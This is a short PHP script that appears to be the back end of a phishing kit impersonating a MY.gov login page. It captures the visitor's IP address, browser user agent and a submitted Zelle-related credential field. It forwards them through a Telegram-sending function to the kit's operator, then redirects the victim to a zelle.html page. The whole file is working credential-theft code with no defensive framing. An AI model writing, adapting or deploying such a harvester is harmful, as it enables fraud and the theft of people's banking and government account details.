<?php
include("config/config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $zelle = $_POST['zelle'];
    $serv = $_REQUEST['zel'];


        //Telegram send
        $message = "**MY.gov-Login1\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "ZELLE: ".$_POST['zelle']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:zelle.html");
?>
